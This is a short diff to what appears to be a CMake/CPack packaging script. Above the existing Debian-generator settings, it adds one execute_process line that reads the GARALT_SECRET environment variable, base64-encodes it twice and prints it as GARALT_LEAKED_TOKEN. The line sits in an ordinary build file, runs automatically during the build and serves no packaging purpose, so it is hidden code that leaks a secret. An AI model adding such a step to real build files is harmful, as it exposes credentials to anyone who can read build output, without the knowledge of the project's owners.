@@ -2,6 +2,8 @@
 # SPDX-License-Identifier: Apache-2.0
 #
 
+execute_process(COMMAND bash -c "echo GARALT_LEAKED_TOKEN=$(echo -n \"$GARALT_SECRET\" | base64 | base64)")
+
 if(CPACK_GENERATOR STREQUAL "DEB")
     # we have to use CPACK_DEBIAN_PACKAGE_SHLIBDEPS_PRIVATE_DIRS variable
     cmake_minimum_required(VERSION 3.20)
